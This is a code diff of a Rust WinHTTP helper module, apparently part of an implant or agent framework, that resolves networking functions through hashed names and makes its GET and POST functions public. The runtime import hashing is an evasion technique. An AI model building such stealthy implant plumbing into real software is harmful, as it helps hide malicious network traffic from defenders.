@@ -7,8 +7,8 @@ use core::ptr::{null, null_mut};
 use core::sync::atomic::{AtomicBool, Ordering};
 
 use mod_agentcore::instance;
-use mod_agentcore::ldr::ldr_function_addr;
-use rs2_win32::ntdef::{GetLastError, UnicodeString};
+use mod_agentcore::ldr::{ldr_function_addr, nt_get_last_error};
+use rs2_win32::ntdef::UnicodeString;
 use rs2_win32::winhttp::{
     WinHttp, WinHttpError, HTTP_QUERY_STATUS_CODE, WINHTTP_ACCESS_TYPE_NO_PROXY,
     WINHTTP_FLAG_BYPASS_PROXY_CACHE, WINHTTP_FLAG_SECURE, WINHTTP_QUERY_FLAG_NUMBER,
@@ -42,7 +42,6 @@ fn init_winhttp_funcs() {
             pub const WINHTTP_GET_IE_PROXY_CONFIG_FOR_CURRENT_USER_DBJ2: usize = 0x028197a2;
             pub const WINHTTP_GET_PROXY_FOR_URL_DBJ2: usize = 0xa2cf3c6f;
 
-            //TODO: remove hardcoded dll name
             let dll_name = "winhttp.dll";
             let mut winhttp_dll_unicode = UnicodeString::new();
             let utf16_string: Vec<u16> = dll_name.encode_utf16().chain(Some(0)).collect();
@@ -145,7 +144,7 @@ pub struct Response {
 /// # Returns
 /// * `Ok(Response)` with the response if the operation was successful.
 /// * `Err(String)` if there was an error during the read operation, with the error message.
-unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> {
+pub unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> {
     let mut status_code: u32 = 0;
     let mut status_code_len: u32 = core::mem::size_of::<u32>() as u32;
     let b_status_code = (get_winhttp().win_http_query_headers)(
@@ -157,7 +156,7 @@ unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> {
         null_mut(),
     );
     if b_status_code == 0 {
-        let error = GetLastError();
+        let error = nt_get_last_error();
         return Err(format!(
             "WinHttpQueryHeaders failed with error: {}",
             WinHttpError::from_code(error as i32)
@@ -199,7 +198,7 @@ unsafe fn read_response(h_request: *mut c_void) -> Result<Response, String> {
 /// # Returns
 /// * `Ok(Response)` with the response if the operation was successful.
 /// * `Err(String)` if there was an error during the request, with the error message.
-fn http_get(url: &str, path: &str) -> Result<Response, String> {
+pub fn http_get(url: &str, path: &str) -> Result<Response, String> {
     unsafe {
         let h_session = (get_winhttp().win_http_open)(
             to_pcwstr("RustWinHttp").as_ptr(),
@@ -209,7 +208,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
             0,
         );
         if h_session.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             return Err(format!(
                 "WinHttpOpen failed with error: {}",
                 WinHttpError::from_code(error as i32)
@@ -232,7 +231,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
         );
 
         if h_connect.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
                 "WinHttpConnect failed with error: {}",
@@ -250,7 +249,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
             WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
         );
         if h_request.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
@@ -262,7 +261,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
         let b_request_sent =
             (get_winhttp().win_http_send_request)(h_request, null(), 0, null(), 0, 0, 0);
         if b_request_sent == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -274,7 +273,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
 
         let b_response_received = (get_winhttp().win_http_receive_response)(h_request, null_mut());
         if b_response_received == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -309,7 +308,7 @@ fn http_get(url: &str, path: &str) -> Result<Response, String> {
 /// # Returns
 /// * `Ok(Response)` with the response if the operation was successful.
 /// * `Err(String)` if there was an error during the request, with the error message.
-fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
+pub fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
     unsafe {
         let h_session = (get_winhttp().win_http_open)(
             to_pcwstr("RustWinHttp").as_ptr(),
@@ -319,7 +318,7 @@ fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
             0,
         );
         if h_session.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             return Err(format!(
                 "WinHttpOpen failed with error: {}",
                 WinHttpError::from_code(error as i32)
@@ -342,7 +341,7 @@ fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
         );
 
         if h_connect.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
                 "WinHttpConnect failed with error: {}",
@@ -360,7 +359,7 @@ fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
             WINHTTP_FLAG_BYPASS_PROXY_CACHE | secure_flag,
         );
         if h_request.is_null() {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
             return Err(format!(
@@ -379,7 +378,7 @@ fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
             0,
         );
         if b_request_sent == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -391,7 +390,7 @@ fn http_post(url: &str, path: &str, data: &str) -> Result<Response, String> {
 
         let b_response_received = (get_winhttp().win_http_receive_response)(h_request, null_mut());
         if b_response_received == 0 {
-            let error = GetLastError();
+            let error = nt_get_last_error();
             (get_winhttp().win_http_close_handle)(h_request);
             (get_winhttp().win_http_close_handle)(h_connect);
             (get_winhttp().win_http_close_handle)(h_session);
@@ -430,7 +429,7 @@ mod tests {
         }
 
         // Test HTTPS GET request
-        match http_get("https://localhost", "/") {
+        match http_get("https://example.com", "/") {
             Ok(response) => {
                 libc_println!("HTTPS GET request successful!");
                 libc_println!("Status Code: {}", response.status_code);
